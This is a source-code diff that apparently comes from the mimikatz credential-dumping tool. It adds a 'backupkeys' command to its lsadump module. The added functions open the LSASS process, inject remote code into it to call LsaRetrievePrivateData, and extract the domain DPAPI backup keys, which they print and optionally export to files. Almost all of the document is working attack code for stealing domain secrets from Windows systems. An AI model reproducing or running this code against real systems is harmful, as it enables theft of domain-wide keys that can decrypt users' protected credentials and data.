@@ -12,6 +12,7 @@ const KUHL_M_C kuhl_m_c_lsadump[] = {
 	{kuhl_m_lsadump_lsa,	L"lsa",			L"Ask LSA Server to retrieve SAM/AD entries (normal, patch on the fly or inject)"},
 	{kuhl_m_lsadump_trust,	L"trust",		L"Ask LSA Server to retrieve Trust Auth Information (normal or patch on the fly)"},
 	{kuhl_m_lsadump_hash,	L"hash",		NULL},
+	{kuhl_m_lsadump_bkey,	L"backupkeys",	NULL},
 };
 
 const KUHL_M kuhl_m_lsadump = {
@@ -1060,7 +1061,7 @@ KULL_M_PATCH_GENERIC SamSrvReferences[] = {
 	{KULL_M_WIN_BUILD_10,		{sizeof(PTRN_WALL_SampQueryInformationUserInternal),	PTRN_WALL_SampQueryInformationUserInternal},	{sizeof(PATC_WALL_JmpShort),	PATC_WALL_JmpShort},	{-8}},
 };
 #endif
-PCWCHAR szSamSrv = L"samsrv.dll", szLsaSrv = L"lsasrv.dll", szNtDll = L"ntdll.dll", szKernel32 = L"kernel32.dll";
+PCWCHAR szSamSrv = L"samsrv.dll", szLsaSrv = L"lsasrv.dll", szNtDll = L"ntdll.dll", szKernel32 = L"kernel32.dll", szAdvapi32 = L"advapi32.dll";
 NTSTATUS kuhl_m_lsadump_lsa(int argc, wchar_t * argv[])
 {
 	NTSTATUS status, enumStatus;
@@ -1587,5 +1588,183 @@ NTSTATUS kuhl_m_lsadump_hash(int argc, wchar_t * argv[])
 	MD5Final(&md5Ctx);
 	kprintf(L"MD5 : "); kull_m_string_wprintf_hex(md5Ctx.digest, MD5_DIGEST_LENGTH, 0); kprintf(L"\n");
 
+	return STATUS_SUCCESS;
+}
+
+NTSTATUS kuhl_m_lsadump_LsaRetrievePrivateData(PCWSTR secretName, PUNICODE_STRING secret)
+{
+	NTSTATUS status = STATUS_UNSUCCESSFUL;
+	PKULL_M_MEMORY_HANDLE hMemory = NULL;	
+	PREMOTE_LIB_INPUT_DATA iData;
+	REMOTE_LIB_OUTPUT_DATA oData;
+	KULL_M_MEMORY_ADDRESS aRemoteFunc;
+
+	REMOTE_EXT extensions[] = {
+		{szAdvapi32,"LsaOpenPolicy",			(PVOID) 0x4141414141414141, NULL},
+		{szAdvapi32,"LsaClose",					(PVOID) 0x4242424242424242, NULL},
+		{szAdvapi32,"LsaFreeMemory",			(PVOID) 0x4343434343434343, NULL},
+		{szAdvapi32,"LsaRetrievePrivateData",	(PVOID) 0x4444444444444444, NULL},
+		{szKernel32,"VirtualAlloc",				(PVOID) 0x4a4a4a4a4a4a4a4a, NULL},
+		{szNtDll,	"memcpy",					(PVOID) 0x4c4c4c4c4c4c4c4c, NULL},
+	};
+	MULTIPLE_REMOTE_EXT extForCb = {ARRAYSIZE(extensions), extensions};
+
+	if(kuhl_m_lsadump_lsa_getHandle(&hMemory, PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD))
+	{
+		if(kull_m_remotelib_CreateRemoteCodeWitthPatternReplace(hMemory, kuhl_lsadump_RetrievePrivateData_thread, (DWORD) ((PBYTE) kuhl_lsadump_RetrievePrivateData_thread_end - (PBYTE) kuhl_lsadump_RetrievePrivateData_thread), &extForCb, &aRemoteFunc))
+		{
+			if(iData = kull_m_remotelib_CreateInput(NULL, 0, (DWORD) wcslen(secretName) * sizeof(wchar_t), secretName))
+			{
+				if(kull_m_remotelib_create(&aRemoteFunc, iData, &oData))
+				{
+					status = oData.outputStatus;
+					if(NT_SUCCESS(status) && oData.outputSize && oData.outputData)
+					{
+						secret->Length = secret->MaximumLength = (USHORT) oData.outputSize;
+						if(secret->Buffer = (PWSTR) LocalAlloc(LPTR, secret->MaximumLength))
+							RtlCopyMemory(secret->Buffer, oData.outputData, secret->MaximumLength);
+
+						LocalFree(oData.outputData);
+					}
+				}
+				LocalFree(iData);
+			}
+			kull_m_memory_free(&aRemoteFunc, 0);
+		}
+		else PRINT_ERROR(L"kull_m_remotelib_CreateRemoteCodeWitthPatternReplace\n");
+
+		if(hMemory->pHandleProcess->hProcess)
+			CloseHandle(hMemory->pHandleProcess->hProcess);
+		kull_m_memory_close(hMemory);
+	}
+
+	return status;
+}
+
+NTSTATUS kuhl_m_lsadump_getKeyFromGUID(LPCGUID guid, BOOL isExport)
+{
+	NTSTATUS status = STATUS_UNSUCCESSFUL;
+	UNICODE_STRING secret;
+	PKIWI_BACKUP_KEY buffer;
+	HCRYPTPROV hCryptProv;
+	HCRYPTKEY hCryptKey;
+	PVOID data;
+	DWORD len;
+
+	wchar_t *filename = NULL, keyName[48+1] = L"G$BCKUPKEY_", *shortname = keyName + 11;
+	keyName[48] = L'\0';
+
+
+	if(NT_SUCCESS(RtlStringFromGUID(guid, &secret)))
+	{
+		RtlCopyMemory(shortname, secret.Buffer + 1, 36 * sizeof(wchar_t));
+		RtlFreeUnicodeString(&secret);
+		
+		status = kuhl_m_lsadump_LsaRetrievePrivateData(keyName, &secret);
+		if(NT_SUCCESS(status))
+		{
+			buffer = (PKIWI_BACKUP_KEY) secret.Buffer;
+			switch(buffer->version)
+			{
+			case 2:
+				kprintf(L"  * RSA key\n");
+				if(CryptAcquireContext(&hCryptProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
+				{
+					if(CryptImportKey(hCryptProv, buffer->data,  buffer->keyLen, 0, CRYPT_EXPORTABLE, &hCryptKey))
+					{
+						kuhl_m_crypto_printKeyInfos(0, hCryptKey);
+
+						if(isExport)
+						{
+							kuhl_m_crypto_exportKeyToFile(0, hCryptKey, AT_KEYEXCHANGE, L"ntds", 0, shortname);
+							filename = kuhl_m_crypto_generateFileName(L"ntds", L"capi", 0, shortname, L"der");
+							data = buffer->data + buffer->keyLen;
+							len = buffer->certLen;
+						}
+						CryptDestroyKey(hCryptKey);
+					}
+					CryptReleaseContext(hCryptProv, 0);
+				}
+				break;
+			case 1:
+				kprintf(L"  * Legacy key\n");
+				kull_m_string_wprintf_hex((PBYTE) secret.Buffer + sizeof(DWORD), secret.Length - sizeof(DWORD), (32 << 16));
+				kprintf(L"\n");
+				if(isExport)
+				{
+					filename = kuhl_m_crypto_generateFileName(L"ntds", L"legacy", 0, shortname, L"key");
+					data = (PBYTE) secret.Buffer + sizeof(DWORD);
+					len = secret.Length - sizeof(DWORD);
+				}
+				break;
+			default:
+				kprintf(L"  * Unknown key (seen as %08x)\n", buffer->version);
+				kull_m_string_wprintf_hex(secret.Buffer, secret.Length, (32 << 16));
+				kprintf(L"\n");
+				if(isExport)
+				{
+					filename = kuhl_m_crypto_generateFileName(L"ntds", L"unknown", 0, shortname, L"key");
+					data = secret.Buffer;
+					len = secret.Length;
+				}
+			}
+
+			if(filename && data && len)
+			{
+				kprintf(L"\tExport         : %s - \'%s\'\n", kull_m_file_writeData(filename, data, len) ? L"OK" : L"KO", filename);
+				LocalFree(filename);
+			}
+
+			LocalFree(secret.Buffer);
+		}
+		else PRINT_ERROR(L"kuhl_m_lsadump_LsaRetrievePrivateData: 0x%08x\n", status);
+	}
+	return status;
+}
+
+NTSTATUS kuhl_m_lsadump_bkey(int argc, wchar_t * argv[])
+{
+	NTSTATUS status;
+	UNICODE_STRING secret;
+	GUID guidPreferredKey, guidW2KPreferredKey;
+	PCWCHAR szGuid = NULL;
+	BOOL export = kull_m_string_args_byName(argc, argv, L"export", NULL, NULL);
+	
+	kull_m_string_args_byName(argc, argv, L"guid", &szGuid, NULL);
+	if(szGuid)
+	{
+		RtlInitUnicodeString(&secret, szGuid);
+		status = RtlGUIDFromString(&secret, &guidPreferredKey);
+		if(NT_SUCCESS(status))
+		{
+			kprintf(L"\n"); kull_m_string_displayGUID(&guidPreferredKey); kprintf(L" seems to be a valid GUID\n");
+			kuhl_m_lsadump_getKeyFromGUID(&guidPreferredKey, export);
+		}
+		else PRINT_ERROR(L"Invalide GUID (0x%08x) ; %s\n", status, szGuid);
+	}
+	else
+	{
+		kprintf(L"\nCurrent prefered key:       "); 
+		status = kuhl_m_lsadump_LsaRetrievePrivateData(L"G$BCKUPKEY_PREFERRED", &secret);
+		if(NT_SUCCESS(status))
+		{
+			guidPreferredKey = *(LPCGUID) secret.Buffer;
+			LocalFree(secret.Buffer);
+			kull_m_string_displayGUID(&guidPreferredKey); kprintf(L"\n");
+			kuhl_m_lsadump_getKeyFromGUID(&guidPreferredKey, export);
+		}
+		else PRINT_ERROR(L"kuhl_m_lsadump_LsaRetrievePrivateData: 0x%08x\n", status);
+
+		kprintf(L"\nCompatibility prefered key: ");
+		status = kuhl_m_lsadump_LsaRetrievePrivateData(L"G$BCKUPKEY_P", &secret);
+		if(NT_SUCCESS(status))
+		{
+			guidW2KPreferredKey = *(LPCGUID) secret.Buffer;
+			LocalFree(secret.Buffer);
+			kull_m_string_displayGUID(&guidW2KPreferredKey); kprintf(L"\n");
+			kuhl_m_lsadump_getKeyFromGUID(&guidW2KPreferredKey, export);
+		}
+		else PRINT_ERROR(L"kuhl_m_lsadump_LsaRetrievePrivateData: 0x%08x\n", status);
+	}
 	return STATUS_SUCCESS;
 }
